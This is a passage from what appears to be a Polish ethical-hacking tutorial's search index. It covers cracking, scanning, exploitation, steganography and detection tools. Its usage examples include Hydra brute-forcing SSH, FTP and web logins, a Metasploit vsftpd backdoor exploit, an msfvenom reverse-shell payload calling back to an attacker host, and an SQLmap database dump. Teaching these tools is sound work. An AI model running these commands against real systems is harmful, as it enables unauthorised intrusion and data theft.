wiele r\u00f3\u017cnych sposob\u00f3w, w tym:</p> <ul> <li>Brute force: pr\u00f3buje wszystkich mo\u017cliwych kombinacji znak\u00f3w.</li> <li>Atak s\u0142ownikowy: pr\u00f3buje hase\u0142 z wcze\u015bniej przygotowanej listy (np. z popularnych hase\u0142).</li> <li>Atak maskowy: pr\u00f3buje hase\u0142 na podstawie okre\u015blonego wzorca.</li> <li>Atak hybrydowy: kombinacja powy\u017cszych technik.</li> </ul> <p>Hashcat</p>"},{"location":"ethical-hacking/tools/hashcat/#przykady-uzycia","title":"Przyk\u0142ady u\u017cycia","text":""},{"location":"ethical-hacking/tools/hashcat/#atak-sownikowy","title":"Atak s\u0142ownikowy","text":"<p>Poni\u017csze polecenie wykonuje atak s\u0142ownikowy na hash MD5:</p> <pre><code>hashcat -m 0 -a 0 hash.txt dictionary.txt\n</code></pre> <p>W tym przypadku <code>-m 0</code> oznacza, \u017ce u\u017cywamy algorytmu MD5, <code>-a 0</code> oznacza atak s\u0142ownikowy. <code>hash.txt</code> to plik z hashem do z\u0142amania, a <code>dictionary.txt</code> to plik ze s\u0142ownikiem hase\u0142.</p>"},{"location":"ethical-hacking/tools/hashcat/#atak-siowy","title":"Atak si\u0142owy","text":"<p>Poni\u017csze polecenie wykonuje atak si\u0142owy na hash MD5, pr\u00f3buj\u0105c wszystkich kombinacji ma\u0142ych liter i cyfr o d\u0142ugo\u015bci do \\(5\\) znak\u00f3w:</p> <pre><code>hashcat -m 0 -a 3 hash.txt ?l?d?d?d?d\n</code></pre> <p>Tutaj <code>-a 3</code> oznacza atak si\u0142owy, a <code>?l?d?d?d?d</code> to maska okre\u015blaj\u0105ca pr\u00f3bowane kombinacje.</p>"},{"location":"ethical-hacking/tools/hashcat/#atak-hybrydowy","title":"Atak hybrydowy","text":"<p>Poni\u017csze polecenie wykonuje atak hybrydowy, korzystaj\u0105c z listy s\u0142\u00f3w i dodaj\u0105c do ka\u017cdego s\u0142owa od jednej do dw\u00f3ch cyfr:</p> <pre><code>hashcat -m 0 -a 6 hash.txt dictionary.txt ?d?d\n</code></pre>"},{"location":"ethical-hacking/tools/hydra/","title":"Hydra","text":"<p>Hydra jest szybkim i skutecznym narz\u0119dziem do atak\u00f3w typu brute force na wiele r\u00f3\u017cnych protoko\u0142\u00f3w i us\u0142ug sieciowych. Jest szeroko stosowana w testach penetracyjnych i CTFach do \u0142amania hase\u0142 i innych informacji uwierzytelniaj\u0105cych.</p> <p>Hydra przeprowadza ataki przeszukuj\u0105c przestrze\u0144 mo\u017cliwych hase\u0142 w celu znalezienia prawid\u0142owego. Atak si\u0142owy polega na systematycznym sprawdzaniu wszystkich mo\u017cliwych kombinacji hase\u0142, dop\u00f3ki nie zostanie znalezione prawid\u0142owe. Hydra potrafi r\u00f3wnocze\u015bnie atakowa\u0107 wiele host\u00f3w i obs\u0142uguje wiele protoko\u0142\u00f3w i us\u0142ug, w tym, mi\u0119dzy innymi, Telnet, FTP, HTTP, HTTPS, SMB, SNMP, SMTP, POP3, IMAP, Oracle, MySQL i wiele innych.</p> <p>Hydra</p>"},{"location":"ethical-hacking/tools/hydra/#przykady-uzycia","title":"Przyk\u0142ady u\u017cycia","text":""},{"location":"ethical-hacking/tools/hydra/#atak-na-ftp","title":"Atak na FTP","text":"<p>Poni\u017csze polecenie wykonuje atak na serwer FTP, u\u017cywaj\u0105c listy u\u017cytkownik\u00f3w users.txt i listy hase\u0142 passwords.txt:</p> <pre><code>hydra -L users.txt -P passwords.txt ftp://192.168.1.100\n</code></pre>"},{"location":"ethical-hacking/tools/hydra/#atak-na-ssh","title":"Atak na SSH","text":"<p>Atak na serwer SSH z konkretnym u\u017cytkownikiem i list\u0105 hase\u0142 wygl\u0105da nast\u0119puj\u0105co:</p> <pre><code>hydra -l admin -P passwords.txt ssh://192.168.1.100\n</code></pre>"},{"location":"ethical-hacking/tools/hydra/#atak-na-formularz-logowania-na-stronie-internetowej","title":"Atak na formularz logowania na stronie internetowej","text":"<p>Hydra potrafi tak\u017ce atakowa\u0107 formularze logowania na stronach internetowych. Poni\u017cej przyk\u0142ad ataku na formularz logowania metod\u0105 POST:</p> <pre><code>hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form \"/login:username=^USER^&amp;password=^PASS^:F=Invalid\"\n</code></pre> <p>W tym przypadku <code>^USER^</code> i <code>^PASS^</code> to miejsca, w kt\u00f3re Hydra wstawia nazwy u\u017cytkownik\u00f3w i has\u0142a z list. <code>F=Invalid</code> oznacza, \u017ce Hydra szuka wyrazu Invalid w odpowiedziach HTTP, aby zidentyfikowa\u0107 nieudane pr\u00f3by logowania.</p>"},{"location":"ethical-hacking/tools/john-the-ripper/","title":"John the Ripper","text":"<p>John the Ripper, zwany r\u00f3wnie\u017c JtR, to jedno z najpopularniejszych narz\u0119dzi do \u0142amania hase\u0142. U\u017cywa r\u00f3\u017cnych technik do \u0142amania hase\u0142, w tym atak\u00f3w s\u0142ownikowych (sprawdzanie hase\u0142 z listy), atak\u00f3w brute force (sprawdzanie wszystkich mo\u017cliwych kombinacji znak\u00f3w) oraz atak\u00f3w hybrydowych (mieszanina atak\u00f3w s\u0142ownikowych i brute force). Obs\u0142uguje wiele format\u00f3w hase\u0142 i jest dost\u0119pny dla wielu system\u00f3w operacyjnych, w tym Linux, Windows i MacOS. Narz\u0119dzie to jest cz\u0119sto u\u017cywane do odzyskiwania utraconych hase\u0142 i testowania ich si\u0142y.</p> <p>John the Ripper</p>"},{"location":"ethical-hacking/tools/john-the-ripper/#przykady-uzycia","title":"Przyk\u0142ady u\u017cycia","text":""},{"location":"ethical-hacking/tools/john-the-ripper/#atak-sownikowy","title":"Atak s\u0142ownikowy","text":"<p>Atak s\u0142ownikowy polega na pr\u00f3bie odgadni\u0119cia has\u0142a za pomoc\u0105 s\u0142\u00f3w z wcze\u015bniej przygotowanej listy (s\u0142ownika). Poni\u017csze polecenie uruchamia atak s\u0142ownikowy na plik hashes.txt za pomoc\u0105 s\u0142ownika dictionary.txt:</p> <pre><code>john --format=descrypt --wordlist=dictionary.txt hashes.txt\n</code></pre>"},{"location":"ethical-hacking/tools/john-the-ripper/#atak-brute-force","title":"Atak brute force","text":"<p>Atak brute force polega na sprawdzeniu wszystkich mo\u017cliwych kombinacji znak\u00f3w. Poni\u017csze polecenie uruchamia atak brute force na plik hashes.txt, sprawdzaj\u0105c wszystkie kombinacje ma\u0142ych liter alfabetu \u0142aci\u0144skiego o d\u0142ugo\u015bci do \\(4\\) znak\u00f3w:</p> <pre><code>john --format=descrypt --incremental=Lower hashes.txt\n</code></pre>"},{"location":"ethical-hacking/tools/john-the-ripper/#wyswietlanie-wynikow","title":"Wy\u015bwietlanie wynik\u00f3w","text":"<p>Aby wy\u015bwietli\u0107 z\u0142amane has\u0142a, u\u017cywamy polecenia <code>--show</code>:</p> <pre><code>john --show hashes.txt\n</code></pre>"},{"location":"ethical-hacking/tools/metasploit/","title":"Metasploit","text":"<p>Metasploit to jeden z najpopularniejszych framework\u00f3w do testowania penetracyjnego. Zosta\u0142 stworzony w celu odkrywania, eksploatowania i walidowania luk bezpiecze\u0144stwa. Wyposa\u017cony jest w setki gotowych eksploit\u00f3w i r\u00f3\u017cnorodne narz\u0119dzia, kt\u00f3re pozwalaj\u0105 na kompleksow\u0105 ocen\u0119 bezpiecze\u0144stwa system\u00f3w i sieci.</p> <p>Warning</p> <p>Korzystanie z Metasploit bez odpowiednich uprawnie\u0144 jest nielegalne i nieetyczne. Pami\u0119taj, \u017ce narz\u0119dzia te s\u0105 stworzone w celu poprawy bezpiecze\u0144stwa, a nie jego \u0142amania.</p> <p>Metasploit</p>"},{"location":"ethical-hacking/tools/metasploit/#podstawowe-funkcje-i-zastosowania","title":"Podstawowe funkcje i zastosowania","text":"<p>Poni\u017cej przedstawimy kilka r\u00f3\u017cnych funkcji i zastosowa\u0144 narz\u0119dzia Metasploit.</p>"},{"location":"ethical-hacking/tools/metasploit/#skanowanie","title":"Skanowanie","text":"<p>Metasploit umo\u017cliwia skanowanie system\u00f3w i sieci w poszukiwaniu potencjalnych luk. Na przyk\u0142ad mo\u017cna zeskanowa\u0107 system za pomoc\u0105 modu\u0142u auxiliary/scanner:</p> <pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_version\nmsf auxiliary(scanner/ssh/ssh_version) &gt; set RHOSTS 192.168.1.0/24\nmsf auxiliary(scanner/ssh/ssh_version) &gt; run\n</code></pre>"},{"location":"ethical-hacking/tools/metasploit/#eksploatacja","title":"Eksploatacja","text":"<p>Gdy luka zostanie znaleziona, Metasploit umo\u017cliwia jej eksploatacj\u0119. Poni\u017cej pokazujemy jak eksploatowa\u0107 podatno\u015b\u0107 w us\u0142udze FTP za pomoc\u0105 modu\u0142u exploit:</p> <pre><code>msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor\nmsf exploit(unix/ftp/vsftpd_234_backdoor) &gt; set RHOST 192.168.1.2\nmsf exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit\n</code></pre>"},{"location":"ethical-hacking/tools/metasploit/#tworzenie-payloadow","title":"Tworzenie payload\u00f3w","text":"<p>Metasploit oferuje mo\u017cliwo\u015b\u0107 tworzenia payload\u00f3w, kt\u00f3re mo\u017cna dostarczy\u0107 do celu, aby uzyska\u0107 dost\u0119p. Mo\u017cna na przyk\u0142ad utworzy\u0107 prosty payload dla systemu Windows:</p> <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe &gt; payload.exe\n</code></pre>"},{"location":"ethical-hacking/tools/metasploit/#przechwytywanie-hase","title":"Przechwytywanie hase\u0142","text":"<p>Metasploit ma wiele modu\u0142\u00f3w do przechwytywania hase\u0142, kt\u00f3re mog\u0105 by\u0107 u\u017cyte do zdobycia dalszych dost\u0119p\u00f3w. Mo\u017cna u\u017cy\u0107 np. modu\u0142u smb_login do sprawdzenia hase\u0142 na podatnych maszynach SMB:</p> <pre><code>msf &gt; use auxiliary/scanner/smb/smb_login\nmsf auxiliary(scanner/smb/smb_login) &gt; set RHOSTS 192.168.1.0/24\nmsf auxiliary(scanner/smb/smb_login) &gt; run\n</code></pre>"},{"location":"ethical-hacking/tools/metasploit/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"ethical-hacking/tools/netcat/","title":"Netcat","text":"<p>Netcat, cz\u0119sto nazywane scyzorykiem szwajcarskim w dziedzinie sieci, to proste, ale niezwykle wszechstronne narz\u0119dzie u\u017cywane do czytania i pisania danych przez po\u0142\u0105czenia sieciowe. Netcat jest w stanie tworzy\u0107 po\u0142\u0105czenia TCP lub UDP mi\u0119dzy dwoma komputerami i przesy\u0142a\u0107 dane mi\u0119dzy nimi.</p> <p>Netcat oferuje wiele niezwykle przydatnych funkcji:</p> <ul> <li>Tworzenie serwer\u00f3w i klient\u00f3w TCP/UDP.</li> <li>Przesy\u0142anie plik\u00f3w mi\u0119dzy maszynami.</li> <li>Skanowanie port\u00f3w.</li> <li>Przekierowywanie port\u00f3w.</li> <li>Tworzenie backdoor\u00f3w i reverse shelli.</li> <li>Testowanie serwis\u00f3w sieciowych.</li> </ul>"},{"location":"ethical-hacking/tools/netcat/#przykady-uzycia","title":"Przyk\u0142ady u\u017cycia","text":""},{"location":"ethical-hacking/tools/netcat/#tworzenie-prostego-serwera-echo","title":"Tworzenie prostego serwera echo","text":"<p>Na jednym komputerze uruchom:</p> <pre><code>nc -l 1234\n</code></pre> <p>Na drugim komputerze po\u0142\u0105cz si\u0119 z serwerem:</p> <pre><code>nc 192.168.1.100 1234\n</code></pre> <p>Teraz wszystko, co wpiszesz na jednym komputerze, zostanie przes\u0142ane do drugiego.</p>"},{"location":"ethical-hacking/tools/netcat/#przesyanie-plikow","title":"Przesy\u0142anie plik\u00f3w","text":"<p>Mo\u017cesz u\u017cy\u0107 Netcat do przesy\u0142ania plik\u00f3w mi\u0119dzy komputerami. Na serwerze uruchom:</p> <pre><code>nc -l 1234 &gt; file.txt\n</code></pre> <p>Na kliencie, aby przes\u0142a\u0107 plik, uruchom:</p> <pre><code>nc 192.168.1.100 1234 &lt; file.txt\n</code></pre>"},{"location":"ethical-hacking/tools/netcat/#port-scanning","title":"Port scanning","text":"<p>Netcat mo\u017ce by\u0107 u\u017cywane do skanowania port\u00f3w na zdalnej maszynie. Poni\u017csze polecenie skanuje porty od 20 do 80 na zdalnym hostie:</p> <pre><code>nc -zv 192.168.1.100 20-80\n</code></pre>"},{"location":"ethical-hacking/tools/netcat/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"ethical-hacking/tools/nikto/","title":"Nikto","text":"<p>Nikto to darmowe, otwarte narz\u0119dzie do testowania bezpiecze\u0144stwa stron internetowych. Jest to skaner, kt\u00f3ry wykonuje kompleksowe testy na serwerach WWW, wykrywaj\u0105c potencjalne problemy i luki bezpiecze\u0144stwa. Nikto jest zdolny do identyfikacji ponad \\(6700\\) potencjalnie niebezpiecznych plik\u00f3w/cgich, sprawdzania serwera i oprogramowania w poszukiwaniu niebezpiecznych wersji oraz wykonywania wielu innych kontroli.</p> <p>Nikto jest zdolny do wykonania wielu r\u00f3\u017cnych test\u00f3w, w tym:</p> <ul> <li>Skanowanie serwera w poszukiwaniu niebezpiecznych plik\u00f3w, skrypt\u00f3w CGI i innych obiekt\u00f3w.</li> <li>Wykrywanie niebezpiecznych wersji oprogramowania serwera.</li> <li>Sprawdzanie konfiguracji serwera pod k\u0105tem potencjalnych problem\u00f3w.</li> <li>Wykonywanie test\u00f3w na podstawie bazy danych znanego oprogramowania niebezpiecznego.</li> </ul>"},{"location":"ethical-hacking/tools/nikto/#przykady-uzycia","title":"Przyk\u0142ady u\u017cycia","text":""},{"location":"ethical-hacking/tools/nikto/#proste-skanowanie","title":"Proste skanowanie","text":"<p>Podstawowe skanowanie z u\u017cyciem Nikto jest proste. Poni\u017cej jest przyk\u0142ad skanowania strony internetowej:</p> <pre><code>nikto -h www.example.com\n</code></pre> <p>Gdzie <code>-h www.example.com</code> to adres strony internetowej do przeskanowania.</p>"},{"location":"ethical-hacking/tools/nikto/#skanowanie-z-uzyciem-proxy","title":"Skanowanie z u\u017cyciem proxy","text":"<p>Nikto umo\u017cliwia skanowanie przez serwer proxy, co jest szczeg\u00f3lnie przydatne podczas test\u00f3w penetracyjnych:</p> <pre><code>nikto -h www.example.com -useproxy http://proxy:8080\n</code></pre> <p>Gdzie <code>-useproxy http://proxy:8080</code> to adres i port serwera proxy.</p>"},{"location":"ethical-hacking/tools/nikto/#zapisywanie-wynikow-do-pliku","title":"Zapisywanie wynik\u00f3w do pliku","text":"<p>Nikto umo\u017cliwia zapisywanie wynik\u00f3w skanowania do pliku:</p> <pre><code>nikto -h www.przykladowa-strona.com -o wyniki.txt\n</code></pre> <p>Gdzie <code>-o wyniki.txt</code> to nazwa pliku, do kt\u00f3rego maj\u0105 by\u0107 zapisane wyniki skanowania.</p>"},{"location":"ethical-hacking/tools/nikto/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"ethical-hacking/tools/nmap/","title":"Nmap (Network Mapper)","text":"<p>Nmap to wolne oprogramowanie u\u017cywane do analizy bezpiecze\u0144stwa sieci i zarz\u0105dzania sieciami. Narz\u0119dzie to jest zdolne do odkrywania host\u00f3w i us\u0142ug w sieci, tworzenia map sieci, skanowania port\u00f3w oraz sprawdzania dost\u0119pnych us\u0142ug i ich wersji. Nmap jest przydatny zar\u00f3wno dla administrator\u00f3w sieci jak i os\u00f3b testuj\u0105cych bezpiecze\u0144stwo sieci.</p> <p>Nmap</p>"},{"location":"ethical-hacking/tools/nmap/#podstawowe-funkcje-i-zastosowania","title":"Podstawowe funkcje i zastosowania","text":"<p>Poni\u017cej przedstawimy kilka r\u00f3\u017cnych funkcji i zastosowa\u0144 narz\u0119dzia Nmap.</p>"},{"location":"ethical-hacking/tools/nmap/#skanowanie-portow","title":"Skanowanie port\u00f3w","text":"<p>Jednym z podstawowych zastosowa\u0144 Nmap jest skanowanie port\u00f3w. Poni\u017csze polecenie skanuje 1000 najcz\u0119\u015bciej u\u017cywanych port\u00f3w na danym ho\u015bcie (np. 192.168.1.1):</p> <pre><code>nmap 192.168.1.1\n</code></pre> <p>Mo\u017cemy tak\u017ce skanowa\u0107 wiele host\u00f3w jednocze\u015bnie, wystarczy poda\u0107 kilka adres\u00f3w IP oddzielonych spacj\u0105:</p> <pre><code>nmap 192.168.1.1 192.168.1.2 192.168.1.3\n</code></pre> <p>Innym sposobem jest u\u017cycie zakresu:</p> <pre><code>nmap 192.168.1.1-3\n</code></pre> <p>Mo\u017cemy tak\u017ce okre\u015bli\u0107 porty, kt\u00f3re chcemy przeskanowa\u0107. W tym celu nale\u017cy skorzysta\u0107 z opcji <code>-p</code>. Dla przyk\u0142adu, \u017ceby zeskanowa\u0107 porty od \\(20\\) do \\(25\\) na ho\u015bcie \\(192.168.1.1\\) napiszemy:</p> <pre><code>nmap -p 20-25 192.168.1.1\n</code></pre>"},{"location":"ethical-hacking/tools/nmap/#wykrywanie-wersji-usug","title":"Wykrywanie wersji us\u0142ug","text":"<p>Nmap potrafi r\u00f3wnie\u017c wykry\u0107 wersje us\u0142ug dzia\u0142aj\u0105cych na poszczeg\u00f3lnych portach. Do tego celu s\u0142u\u017cy opcja <code>-sV</code>:</p> <pre><code>nmap -sV 192.168.1.1\n</code></pre>"},{"location":"ethical-hacking/tools/nmap/#skanowanie-z-uzyciem-tcp-syn","title":"Skanowanie z u\u017cyciem TCP SYN","text":"<p>Standardowe skanowanie Nmapa mo\u017ce by\u0107 \u0142atwo wykryte przez systemy IDS/IPS. Skanowanie z u\u017cyciem TCP SYN (zwane r\u00f3wnie\u017c p\u00f3\u0142otwartym skanowaniem) jest bardziej dyskretne. U\u017cywamy do tego opcji <code>-sS</code>:</p> <pre><code>nmap -sS 192.168.1.1\n</code></pre>"},{"location":"ethical-hacking/tools/nmap/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"ethical-hacking/tools/snort/","title":"Snort","text":"<p>Snort to darmowe narz\u0119dzie do wykrywania w\u0142ama\u0144 (IDS - Intrusion Detection System) i zapobiegania w\u0142amaniom (IPS - Intrusion Prevention System), kt\u00f3re jest powszechnie stosowane w \u015brodowiskach bezpiecze\u0144stwa sieciowego. Narz\u0119dzie to jest zdolne do przeprowadzania analizy ruchu sieciowego w czasie rzeczywistym oraz wykrywania r\u00f3\u017cnych rodzaj\u00f3w atak\u00f3w, takich jak ataki typu buffer overflow, stealth port scans, CGI ataki, SMB pr\u00f3bki, OS fingerprinting attempts i inne.</p> <p>Snort jest systemem wykrywania i zapobiegania w\u0142amaniom w czasie rzeczywistym. Jest oparty na regu\u0142ach, co oznacza, \u017ce dzia\u0142anie Snort jest sterowane zestawem regu\u0142, kt\u00f3re definiuj\u0105, jakie dzia\u0142ania maj\u0105 by\u0107 podejmowane w przypadku wykrycia okre\u015blonego typu ruchu sieciowego.</p> <p>Regu\u0142y Snort s\u0105 bardzo konfigurowalne i umo\u017cliwiaj\u0105 definiowanie r\u00f3\u017cnych typ\u00f3w alert\u00f3w na podstawie r\u00f3\u017cnych kryteri\u00f3w, takich jak adresy IP, porty, typy pakiet\u00f3w i inne.</p>"},{"location":"ethical-hacking/tools/snort/#przykady-uzycia","title":"Przyk\u0142ady u\u017cycia","text":""},{"location":"ethical-hacking/tools/snort/#przechwytywanie-i-analiza-ruchu-sieciowego","title":"Przechwytywanie i analiza ruchu sieciowego","text":"<p>Podstawowe u\u017cycie Snort polega na przechwytywaniu i analizie ruchu sieciowego. Poni\u017csze polecenie uruchamia Snort w trybie przechwytywania i analizy pakiet\u00f3w na interfejsie eth0:</p> <pre><code>snort -i eth0 -c /etc/snort/snort.conf\n</code></pre> <p>Gdzie:</p> <ul> <li><code>-i eth0</code> to interfejs, na kt\u00f3rym Snort ma przechwytywa\u0107 pakiety.</li> <li><code>-c /etc/snort/snort.conf</code> to \u015bcie\u017cka do pliku konfiguracyjnego Snort.</li> </ul>"},{"location":"ethical-hacking/tools/snort/#generowanie-alertow","title":"Generowanie alert\u00f3w","text":"<p>Snort mo\u017ce generowa\u0107 alerty na podstawie zdefiniowanych regu\u0142. Na przyk\u0142ad, poni\u017csza regu\u0142a generuje alert, gdy Snort wykryje pr\u00f3b\u0119 skanowania port\u00f3w:</p> <pre><code>alert tcp any any -&gt; $HOME_NET any (msg:\"Possible port scan detected\"; flags: S; threshold: type threshold, track by_src, count 1, seconds 60; sid:10001;)\n</code></pre> <p>Gdzie:</p> <ul> <li><code>alert</code> oznacza, \u017ce ta regu\u0142a generuje alert.</li> <li><code>tcp any any -&gt; $HOME_NET any</code> definiuje, \u017ce regu\u0142a dotyczy wszystkich pakiet\u00f3w TCP kierowanych do jakiejkolwiek sieci zdefiniowanej jako <code>HOME_NET</code>.</li> <li><code>msg:\"Possible port scan detected\"</code> to wiadomo\u015b\u0107 wy\u015bwietlana, gdy regu\u0142a jest spe\u0142niona.</li> <li><code>flags: S</code> oznacza, \u017ce regu\u0142a dotyczy pakiet\u00f3w TCP z flag\u0105 SYN.</li> <li><code>threshold: type threshold, track by_src, count 1, seconds 60</code> definiuje, \u017ce alert jest generowany, gdy regu\u0142a jest spe\u0142niona co najmniej raz w ci\u0105gu \\(60\\) sekund.</li> <li><code>sid:10001</code> to unikalny identyfikator regu\u0142y.</li> </ul> <p>Powy\u017cszy przyk\u0142ad jest bardzo prostym przyk\u0142adem u\u017cycia Snort. W praktyce regu\u0142y Snort mog\u0105 by\u0107 znacznie bardziej skomplikowane i precyzyjne, co pozwala na bardzo dok\u0142adn\u0105 kontrol\u0119 nad tym, co jest wykrywane i jak na to reagowa\u0107.</p>"},{"location":"ethical-hacking/tools/snort/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"ethical-hacking/tools/sqlmap/","title":"SQLmap","text":"<p>SQLmap to pot\u0119\u017cne narz\u0119dzie do test\u00f3w penetracyjnych, kt\u00f3re automatyzuje proces wykrywania i wykorzystywania luk w zabezpieczeniach SQL Injection. Narz\u0119dzie to jest otwarto\u017ar\u00f3d\u0142owe i dost\u0119pne dla wielu platform, w tym Linux, MacOS i Windows.</p> <p>SQLmap automatyzuje proces wykrywania i wykorzystywania luk w zabezpieczeniach SQL Injection. Narz\u0119dzie to skanuje cele, identyfikuje potencjalne podatno\u015bci, a nast\u0119pnie automatycznie wykorzystuje je do uzyskania dost\u0119pu do danych. SQLmap jest w stanie automatycznie rozpoznawa\u0107 i obs\u0142ugiwa\u0107 r\u00f3\u017cne bazy danych, takie jak MySQL, Oracle, PostgreSQL i wiele innych.</p> <p>SQLmap</p>"},{"location":"ethical-hacking/tools/sqlmap/#przykady-uzycia","title":"Przyk\u0142ady u\u017cycia","text":""},{"location":"ethical-hacking/tools/sqlmap/#wykrywanie-luk-sql-injection","title":"Wykrywanie luk SQL Injection","text":"<p>Aby przeskanowa\u0107 okre\u015blony URL pod k\u0105tem podatno\u015bci na SQL Injection, mo\u017cna u\u017cy\u0107 poni\u017cszego polecenia:</p> <pre><code>sqlmap -u \"http://example.com/index.php?id=1\"\n</code></pre>"},{"location":"ethical-hacking/tools/sqlmap/#wykorzystywanie-luk-sql-injection","title":"Wykorzystywanie luk SQL Injection","text":"<p>Je\u015bli SQLmap znajduje podatno\u015b\u0107, mo\u017ce automatycznie j\u0105 wykorzysta\u0107. Poni\u017csze polecenie przeskanuje URL, a nast\u0119pnie, je\u015bli znajdzie luki, automatycznie uzyska dane z bazy danych:</p> <pre><code>sqlmap -u \"http://example.com/index.php?id=1\" --dump\n</code></pre>"},{"location":"ethical-hacking/tools/sqlmap/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"ethical-hacking/tools/steghide/","title":"Steghide","text":"<p>Steghide to narz\u0119dzie do steganografii, kt\u00f3re umo\u017cliwia ukrywanie danych w r\u00f3\u017cnego rodzaju plikach multimedialnych, takich jak obrazy i pliki audio. Narz\u0119dzie to jest dost\u0119pne na platformach Linux i Windows. Steghide wspiera wiele format\u00f3w plik\u00f3w, w tym JPEG, BMP, WAV i AU. Dane s\u0105 ukrywane w taki spos\u00f3b, \u017ce nie wp\u0142ywaj\u0105 na jako\u015b\u0107 pliku multimedialnego, co czyni je trudnymi do wykrycia bez odpowiednich narz\u0119dzi. Dodatkowo, Steghide obs\u0142uguje silne szyfrowanie i hashowanie, co zabezpiecza ukryte dane przed nieautoryzowanym dost\u0119pem.</p> <p>Steghide</p>"},{"location":"ethical-hacking/tools/steghide/#przykady-uzycia","title":"Przyk\u0142ady u\u017cycia","text":""},{"location":"ethical-hacking/tools/steghide/#ukrywanie-pliku-w-obrazie","title":"Ukrywanie pliku w obrazie","text":"<p>Aby ukry\u0107 plik secret.txt w obrazie image.jpg, mo\u017cna u\u017cy\u0107 poni\u017cszego polecenia:</p> <pre><code>steghide embed -cf image.jpg -ef secret.txt\n</code></pre> <p>Steghide poprosi o has\u0142o, kt\u00f3re b\u0119dzie potrzebne do wyodr\u0119bnienia pliku w przysz\u0142o\u015bci.</p>"},{"location":"ethical-hacking/tools/steghide/#wyodrebnianie-ukrytego-pliku","title":"Wyodr\u0119bnianie ukrytego pliku","text":"<p>Aby wyodr\u0119bni\u0107 ukryty plik z obrazu, mo\u017cna u\u017cy\u0107 poni\u017cszego polecenia:</p> <pre><code>steghide extract -sf image.jpg\n</code></pre> <p>Steghide poprosi o has\u0142o, kt\u00f3re zosta\u0142o u\u017cyte podczas ukrywania pliku. Po wprowadzeniu prawid\u0142owego has\u0142a, ukryty plik zostanie wyodr\u0119bniony.</p>"},{"location":"ethical-hacking/tools/stegosuite/","title":"Stegosuite","text":"<p>Stegosuite to otwarto\u017ar\u00f3d\u0142owe narz\u0119dzie do steganografii napisane w Javie, kt\u00f3re umo\u017cliwia ukrywanie informacji w r\u00f3\u017cnych typach plik\u00f3w obraz\u00f3w, takich jak GIF, JPG, BMP i PNG. Interfejs graficzny Stegosuite'u czyni go przyjaznym dla u\u017cytkownika i \u0142atwym w obs\u0142udze.</p> <p>Stegosuite ukrywa informacje w plikach obraz\u00f3w poprzez subtelne modyfikacje pikseli, kt\u00f3re nie s\u0105 zauwa\u017calne dla ludzkiego oka. Dzi\u0119ki temu osoba przegl\u0105daj\u0105ca obraz nie jest w stanie zauwa\u017cy\u0107 ukrytych informacji bez u\u017cycia odpowiednich narz\u0119dzi steganograficznych. Stegosuite obs\u0142uguje tak\u017ce szyfrowanie ukrytych danych, zwi\u0119kszaj\u0105c poziom ich bezpiecze\u0144stwa.</p> <p>Stegosuite</p>"},{"location":"ethical-hacking/tools/stegosuite/#przykady-uzycia","title":"Przyk\u0142ady u\u017cycia","text":"<p>Poniewa\u017c Stegosuite korzysta z graficznego interfejsu u\u017cytkownika, jego obs\u0142uga jest do\u015b\u0107 prosta i intuicyjna.</p>"},{"location":"ethical-hacking/tools/stegosuite/#ukrywanie-informacji-w-obrazie","title":"Ukrywanie informacji w obrazie","text":"<ol> <li>Wybierz File -&gt; Open w menu, a nast\u0119pnie wybierz obraz, w kt\u00f3rym chcesz ukry\u0107 informacje.</li> <li>Wpisz informacje, kt\u00f3re chcesz ukry\u0107, w polu Message. Mo\u017cesz tak\u017ce za\u0142adowa\u0107 plik z wiadomo\u015bci\u0105 klikaj\u0105c File -&gt; Load.</li> <li>Kliknij Embed i wprowad\u017a has\u0142o, je\u015bli chcesz zaszyfrowa\u0107 ukryte informacje. Wybierz miejsce, w kt\u00f3rym chcesz zapisa\u0107 zmodyfikowany obraz.</li> </ol>"},{"location":"ethical-hacking/tools/stegosuite/#wyodrebnianie-ukrytych-informacji-z-obrazu","title":"Wyodr\u0119bnianie ukrytych informacji z obrazu","text":"<ol> <li>Wybierz File -&gt; Openw menu, a nast\u0119pnie wybierz obraz z ukrytymi informacjami.</li> <li>Kliknij Extract i wprowad\u017a has\u0142o, je\u017celi informacje zosta\u0142y zaszyfrowane. Ukryte informacje pojawi\u0105 si\u0119 w polu Message.</li> </ol>"},{"location":"ethical-hacking/tools/tcpdump/","title":"Tcpdump","text":"<p>Tcpdump to pot\u0119\u017cne narz\u0119dzie linii polece\u0144 u\u017cywane do przechwytywania i analizy ruchu sieciowego. Pozwala u\u017cytkownikowi podgl\u0105da\u0107 ruch sieciowy, kt\u00f3ry przechodzi przez system. Tcpdump jest najcz\u0119\u015bciej u\u017cywane do diagnozowania problem\u00f3w z sieci\u0105 oraz do monitorowania aktywno\u015bci sieciowej.</p> <p>Tcpdump umo\u017cliwia przechwytywanie pakiet\u00f3w, kt\u00f3re przemieszczaj\u0105 si\u0119 przez okre\u015blony interfejs sieciowy. Po przechwyceniu pakiet\u00f3w, Tcpdump mo\u017ce zapisywa\u0107 je do pliku do p\u00f3\u017aniejszej analizy lub wy\u015bwietla\u0107 je w czasie rzeczywistym. Tcpdump oferuje mo\u017cliwo\u015b\u0107 filtrowania ruchu sieciowego na podstawie r\u00f3\u017cnych kryteri\u00f3w, takich jak typ protoko\u0142u, adres IP, port i inne.</p>"},{"location":"ethical-hacking/tools/tcpdump/#przykady-uzycia","title":"Przyk\u0142ady u\u017cycia","text":""},{"location":"ethical-hacking/tools/tcpdump/#przechwytywanie-ruchu-sieciowego","title":"Przechwytywanie ruchu sieciowego","text":"<p>Podstawowe u\u017cycie Tcpdump polega na przechwytywaniu ruchu sieciowego przechodz\u0105cego przez okre\u015blony interfejs. Poni\u017csze polecenie przechwytuje ruch na interfejsie <code>eth0</code>:</p> <pre><code>tcpdump -i 